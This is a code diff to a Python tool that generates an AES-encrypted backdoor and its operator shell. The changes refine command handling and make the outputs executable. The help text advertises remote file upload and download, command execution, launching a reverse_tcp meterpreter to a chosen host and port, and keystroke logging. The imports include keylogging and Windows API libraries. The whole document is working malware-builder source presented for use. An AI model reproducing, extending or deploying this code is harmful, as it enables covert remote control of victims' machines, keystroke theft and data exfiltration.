@@ -1,7 +1,7 @@
 #!/usr/bin/python
 
 from Crypto.Cipher import AES
-import base64, random, string, sys, re
+import base64, random, string, sys, re, os
 
 BLOCK_SIZE = 32
 PADDING = '{'
@@ -202,7 +202,8 @@ encrypted = EncodeAES(cipherEnc, readyscript)
 
 b64var = randVar()
 aesvar = 'AES'
-f.write('''import subprocess,socket,base64,os,struct,socket,binascii,ctypes,threading,string;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
+f.write('''#!/usr/bin/env python
+import subprocess,socket,base64,os,struct,socket,binascii,ctypes,threading,string;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
 try:
 	import win32api,win32gui,win32file,win32console,pyHook,pythoncom
 except:
@@ -214,18 +215,15 @@ f.close()
 rawserv = '''#!/usr/bin/env python
 from Crypto.Cipher import AES
 from Crypto import Random
-import readline,socket,base64,os,sys
+import readline,socket,base64,os,sys,string
 
 def fnextcmd():
 	global nextcmd, downfile, upfile
-	nextcmd = False
+	nextcmd, donenothing = False, False
 	while not nextcmd:
 		nextcmd = raw_input("[AES-shell]>")
 
-	if not nextcmd.startswith('upload '):
-		encrypted = EncodeAES(cipher, nextcmd)
-		s.send(encrypted)
-	else:
+	if nextcmd.startswith('upload '):
 		upfile = nextcmd.split(' ')[1]
 		ufilename = upfile.split('/')[-1].split('***')[-1]
 		if len(ufilename) > 16:
@@ -241,12 +239,16 @@ def fnextcmd():
 				print ' [X] Error, %s not found!**n' % (upfile)
 				fnextcmd()
 
-	if nextcmd == '?' or nextcmd == 'help':
+	elif nextcmd == '?' or nextcmd == 'help':
 		print ' AEShell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run command         -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n'
  		fnextcmd()
 
-	if nextcmd.startswith('download '):
+	elif nextcmd.startswith('download '):
 		downfile = nextcmd.split(' ')[1].split('/')[-1].split('***')[-1]
+
+	else:
+		encrypted = EncodeAES(cipher, nextcmd)
+		s.send(encrypted)
 
 BLOCK_SIZE = 32
 PADDING = '{'
@@ -291,7 +293,8 @@ while True:
 		fnextcmd()
 
 	else:
-		print decrypted
+		if decrypted:
+			print decrypted
 
 	if nextcmd == 'exit' or nextcmd == 'quit':
 		break
@@ -300,4 +303,5 @@ se = open(serverName, 'wb')
 finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('***', '\\\\')
 se.write(finalserver)
 se.close()
+os.system('chmod +x %s %s' % (outputName, serverName))
 print "\n [*] Backdoor written to %s\n [*] Server written to %s" % (outputName, serverName)
